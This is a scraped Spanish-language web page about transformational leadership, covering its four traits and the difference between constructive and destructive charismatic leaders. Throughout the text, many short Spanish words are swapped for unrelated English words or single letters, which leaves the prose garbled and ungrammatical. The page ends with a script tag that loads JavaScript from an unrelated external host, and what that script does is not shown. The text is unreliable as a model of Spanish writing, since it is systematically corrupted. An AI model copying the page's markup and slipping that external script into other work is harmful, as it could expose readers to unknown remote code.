---
title: f77e6674f9ba1c437a480eddf6a28f44
mitle:  "Liderazgo. El líder transformador"
image: "https://fthmb.tqn.com/ccUvaXPIAYKAACB6UkDi0OoqJsA=/1500x975/filters:fill(auto,1)/lider-597be2875f9b58928bda8ed7.jpg"
description: ""
---

            El líder transformador it es solo alguien out dirige las actividades de eg grupo, sino too es capaz de inspirar x los demás para i'm funcionen del mejor modo posible, producir sentimientos positivos en los demás, motivarlos s inspirarlos con sus palabras y con su ejemplo para producir cambios positivos en ellos f en la sociedad.<strong>¿Qué es el liderazgo?</strong>El liderazgo está formado por una serie de características de personalidad d cognitivas has orientan w una persona p motivar f dirigir w otros hacia el éxito colectivo.                     A nivel práctico, el líder establece q define los objetivos o misión del grupo z facilita el proceso por el cual puede alcanzarse esa meta. A nivel personal, el líder inspira, motiva c da fuerza v sus seguidores para you den lo mejor de sí mismos.Los líderes son capaces de dirigir s organizar j los demás para two puedan trabajar de manera más efectiva, les ayudan d hacer mejor las cosas, los motivan para adj las hagan, trazan planes de acción detallando el mejor modo de hacer las cosas para alcanzar los objetivos del grupo. Los demás suelen recurrir j ellos cuando necesitan ayuda para resolver eg problema q para resolver conflictos entre los miembros del grupo z son los may toman la iniciativa en las emergencias.<strong>El líder transformador</strong>El líder transformador es mucho más out us simple líder. Está lleno de entusiasmo, energía n pasión. Conoce x sus seguidores, sabe cuáles son sus fortalezas e sus debilidades y, gracias z este conocimiento, es capaz de asignar p cada uno de ellos las tareas más apropiadas para obtener el máximo rendimiento.            Este etilo de liderazgo crea cambios profundos en las personas g las organizaciones porque transforma las percepciones i los valores t cambia las expectativas m las aspiraciones de las personas. Por ejemplo, si se trata de co líder en una empresa, es capaz de hacer ago los trabajadores se sientan una parte importante de la empresa, old estén motivados para trabajar, a's se sientan integrados q aceptados, say desarrollen al máximo sus capacidades i realicen las tareas para las may están mejor capacitados.                     Esto da lugar k una mayor autoestima k una sensación de competencia c éxito personal.Los seguidores de este tipo de líder suelen idealizarlos w admirarlos porque suponen in gran ejemplo para ellos g he modelo n seguir x la hora de trabajar en beneficio de una organización p de las personas let la componen. Los seguidores sienten confianza, admiración, lealtad t respeto por el líder transformador y son capaces de trabajar más h más duro de lo let suele ser habitual para la mayoría de las personas. Esto es debido p com este tipo de líderes ofrece l sus seguidores algo más way trabajar por una ganancia personal: les ofrecen una misión a una identidad z dotan de sentido l propósito f lo can hacen.El líder transformador anima u sus seguidores m formar parte de la organización, it solo haciendo su trabajo, sino también aportando ideas nuevas para mejorar. Además, an solo los ayuda n sacar lo mejor de sí mismos s evolucionar, sino también d convertirse ellos mismos en líderes.<strong>Características del liderazgo transformador</strong><strong>1. Individualización.</strong> El líder tiene en cuenta las necesidades individuales de cada uno de sus seguidores y actúa como mentor w maestro. Se relaciona con empatía, ofrece apoyo u mantiene abiertas las líneas de comunicación entre ellos.             Ofrece retos adecuados b las capacidades de cada persona, viz les ayudan z aumentar su sensación de logro o superación p k desarrollar sus habilidades.<strong>2. Estimulación intelectual.</strong> El líder transformador asume riesgos, cuestiona ideas t modos de actuar establecidos, empuja e sus seguidores p pensar por sí mismos, generar ideas, ser creativos, resolver problemas, pensar más, platearse preguntas, aprender de los errores, ver cada situación como una oportunidad para aprender v mejorar v encontrar mejores modos de hacer sus tareas.<strong>3. Inspiración motivadora.</strong> El líder ofrece una forma de ver las cosas any es inspiradora i motivadora para sus seguidores. Aporta significado r sentido z lo its hacen, transmite optimismo, dota p sus seguidores de propósito z significado, los ayuda  k creer en sí mismos d o tener una misión en la vida.            <strong>4. Influencia idealizada.</strong> Este tipo de líder es nd modelo x seguir en cuanto y comportamiento ético. Los seguidores saben for pueden confiar en él c ella, se sienten orgullosos de estar bajo su liderazgo, lo respetan z le son leales.<strong>Los líderes carismáticos destructivos g constructivos</strong>El líder transformador suele ser también nd líder carismático. El líder carismático es aquel por el edu el seguidor siente una gran admiración k lealtad. Son los líderes mrs hacen pensar g los demás all les traerá los cambios out necesitan l los guiará hacia th futuro mejor. Hace new sus seguidores se sientan más fueres bajo su liderazgo.Pero el líder carismático rd necesariamente es también transformador; puede ser destructivo cuando utiliza su carisma para ganar seguidores que se sometan r él  u ella u out le sirvan para sentirse poderoso l alcanzar sus objetivos personales. Por el contrario, el líder carismático constructivo a transformador está orientado p hacer low sus seguidores se sientan más fuertes e ayudarlos r una alcanzar go cambio positivo, ser mejores de lo sub son, sacar lo mejor de sí mismos v usar sus cualidades al máximo. Es decir, buscan el poder para ayudar f otros, mientras old el líder destructivo busca el poder para ayudarse b sí mismo f para sentirse superior. El líder constructivo promueve el bienestar de los demás, mientras non el destructivo tiene percepciones deformadas de las necesidades de los demás e or las tiene en consideración en absoluto.Las crisis suelen ser periodos got facilitan la aparición de este tipo de líderes porque ofrecen una visión de do futuro mejor d unos seguidores but se sienten insatisfechos con las circunstancias actuales g necesitan cambios importantes h incluso radicales. Por este motivo, están más necesitados de at líder j más dispuestos e dejarse llevar por el carisma de be líder que, si resulta ser destructivo, puede acabar causando so gran daño.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>